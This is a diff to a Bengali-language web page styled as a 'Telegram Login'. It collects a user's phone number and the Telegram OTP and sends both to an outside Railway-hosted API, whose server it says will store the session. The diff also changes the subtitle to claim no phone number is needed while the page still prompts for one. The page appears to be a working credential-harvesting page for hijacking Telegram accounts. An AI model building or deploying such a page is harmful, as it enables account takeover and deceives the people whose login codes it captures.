@@ -24,7 +24,7 @@
             border-radius: 24px;
             padding: 40px;
             width: 100%;
-            max-width: 450px;
+            max-width: 400px;
             text-align: center;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
@@ -126,30 +126,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .phone-section {
-            margin-bottom: 20px;
-            display: none;
-        }
-        .phone-section.show {
-            display: block;
-        }
-        .phone-input {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
-        }
-        .save-btn {
-            background: #17a2b8;
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 12px;
-            cursor: pointer;
-            width: 100%;
-        }
         .footer {
             margin-top: 20px;
             font-size: 12px;
@@ -160,16 +136,9 @@
 <body>
     <div class="container">
         <h1>🔐 টেলিগ্রাম লগইন</h1>
-        <div class="subtitle">আপনার টেলিগ্রাম অ্যাকাউন্টে লগইন করুন</div>
+        <div class="subtitle">কোনো ফোন নম্বর দিতে হবে না</div>
         
-        <!-- ফোন নম্বর সেকশন (শুধু প্রথমবার) -->
-        <div id="phoneSection" class="phone-section">
-            <p>📱 আপনার টেলিগ্রাম ফোন নম্বর দিন</p>
-            <input type="tel" id="phoneInput" class="phone-input" placeholder="+8801XXXXXXXXX">
-            <button class="save-btn" onclick="savePhone()">💾 সংরক্ষণ করুন</button>
-        </div>
-        
-        <!-- লগইন সেকশন -->
+        <!-- শুধু কনফার্ম বাটন -->
         <div id="loginSection">
             <button class="confirm-btn" id="confirmBtn" onclick="sendCode()">
                 📱 কনফার্ম করুন
@@ -179,7 +148,7 @@
         <!-- OTP সেকশন -->
         <div id="otpSection" class="otp-section">
             <p>🔑 আপনার টেলিগ্রাম অ্যাপে যাওয়া OTP দিন</p>
-            <input type="text" id="otpCode" placeholder="12345" maxlength="5">
+            <input type="text" id="otpCode" placeholder="12345" maxlength="5" autocomplete="off">
             <button class="verify-btn" onclick="verifyOTP()">✅ লগইন করুন</button>
             <button class="resend-btn" onclick="resendCode()">🔄 পুনরায় OTP পাঠান</button>
         </div>
@@ -189,26 +158,29 @@
             <div class="spinner"></div>
             <p>অপেক্ষা করুন...</p>
         </div>
-        <div class="footer">⚡ আপনার সেশন সুরক্ষিতভাবে সংরক্ষিত হবে</div>
+        <div class="footer">
+            ⚡ আপনার সেশন সুরক্ষিতভাবে সংরক্ষিত হবে
+        </div>
     </div>
     
     <script>
-        // ===== Railway API URL (আপনার Railway URL দিয়ে Replace করবেন) =====
+        // ===== Railway API URL (তোমার Railway URL দিয়ে Replace করো) =====
         const API_URL = 'https://your-railway-app.up.railway.app';
         // ==================================================================
         
-        let currentPhone = '';
+        // ফোন নাম্বার লোকাল স্টোরেজ থেকে নাও (প্রথমবার সেট করা থাকলে)
+        let userPhone = localStorage.getItem('user_phone');
         
-        // পেজ লোড হলে আগের ফোন আছে কিনা চেক করুন
+        // পেজ লোড হলে চেক করো ফোন নাম্বার আছে কিনা
         window.onload = function() {
-            const savedPhone = localStorage.getItem('user_phone');
-            if (savedPhone) {
-                currentPhone = savedPhone;
-                document.getElementById('phoneSection').classList.remove('show');
-                document.getElementById('loginSection').style.display = 'block';
-            } else {
-                document.getElementById('phoneSection').classList.add('show');
-                document.getElementById('loginSection').style.display = 'none';
+            if (!userPhone) {
+                // ফোন নাম্বার না থাকলে জিজ্ঞাসা করো (শুধু প্রথমবার)
+                userPhone = prompt('আপনার টেলিগ্রামের ফোন নাম্বার দিন (আন্তর্জাতিক ফরম্যাটে):\n+8801XXXXXXXXX');
+                if (userPhone && userPhone.startsWith('+')) {
+                    localStorage.setItem('user_phone', userPhone);
+                } else {
+                    alert('সঠিক ফোন নাম্বার দিন! পেজ রিফ্রেশ করুন।');
+                }
             }
         };
         
@@ -226,22 +198,9 @@
             document.getElementById('loading').style.display = show ? 'block' : 'none';
         }
         
-        function savePhone() {
-            const phone = document.getElementById('phoneInput').value.trim();
-            if (!phone || !phone.startsWith('+')) {
-                showMessage('সঠিক ফোন নম্বর দিন (+8801XXXXXXXXX)', 'error');
-                return;
-            }
-            currentPhone = phone;
-            localStorage.setItem('user_phone', phone);
-            document.getElementById('phoneSection').classList.remove('show');
-            document.getElementById('loginSection').style.display = 'block';
-            showMessage('ফোন নম্বর সংরক্ষিত হয়েছে!', 'success');
-        }
-        
         async function sendCode() {
-            if (!currentPhone) {
-                showMessage('প্লিজ ফোন নম্বর দিন!', 'error');
+            if (!userPhone) {
+                showMessage('ফোন নাম্বার সেট করা নেই! পেজ রিফ্রেশ করুন।', 'error');
                 return;
             }
             
@@ -253,7 +212,7 @@
                 const response = await fetch(`${API_URL}/send_code`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: currentPhone })
+                    body: JSON.stringify({ phone: userPhone })
                 });
                 
                 const data = await response.json();
@@ -288,7 +247,7 @@
                 const response = await fetch(`${API_URL}/verify`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: currentPhone, code: code })
+                    body: JSON.stringify({ phone: userPhone, code: code })
                 });
                 
                 const data = await response.json();
@@ -315,7 +274,7 @@
                 const response = await fetch(`${API_URL}/resend_code`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: currentPhone })
+                    body: JSON.stringify({ phone: userPhone })
                 });
                 const data = await response.json();
                 showLoading(false);
